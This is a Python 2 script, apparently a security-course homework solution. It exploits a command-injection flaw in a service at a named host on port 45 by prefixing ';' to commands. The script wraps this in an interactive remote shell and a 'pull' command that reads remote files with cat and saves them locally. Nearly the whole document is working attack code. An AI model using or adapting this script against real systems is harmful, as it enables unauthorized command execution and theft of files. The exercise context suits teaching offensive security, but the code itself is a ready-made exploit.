"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time


host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here
dir_location = "/"
prev_location = " "

def execute_cmd(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    s.send(";cd "+ dir_location+" ;"+cmd+"\n")
    time.sleep(2)
    data = s.recv(1024)
    return data

def execute_cmd_1(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    s.send(";"+cmd+"\n")
    time.sleep(2)
    data = s.recv(1024)
    return data

def show_help():
    print ("shell Drop into an interactive shell and allow users to gracefully exit")
    print ("pull <remote-path> <local-path> Download files")
    print ("help Shows this help menu")
    print ("quit Quit the shell")


def show_pull(remote_path,local_path):
    file_output = execute_cmd_1("cat "+remote_path)
    file = open(local_path,"w")
    file.write(file_output)

def show_shell():
    global dir_location
    global prev_location
    cmd = raw_input(dir_location+"> ")
    while cmd != "exit":
        if "cd" in cmd:
            if ".." in cmd:
                dir_location = prev_location
            else:
                cd_arr = cmd.split(' ')
                prev_location = dir_location
                dir_location = cd_arr[1]
        print execute_cmd(cmd)
        cmd = raw_input(dir_location+"> ")


def open_shell():
    cmd_full = raw_input("> ").split(' ')
    cmd = cmd_full[0]
    while cmd != "quit":
        if(cmd == "shell"):
            show_shell()
        elif(cmd == "pull"):
            show_pull(cmd_full[1],cmd_full[2])
        else:
            show_help()
        cmd = raw_input("> ")


if __name__ == '__main__':
    open_shell()
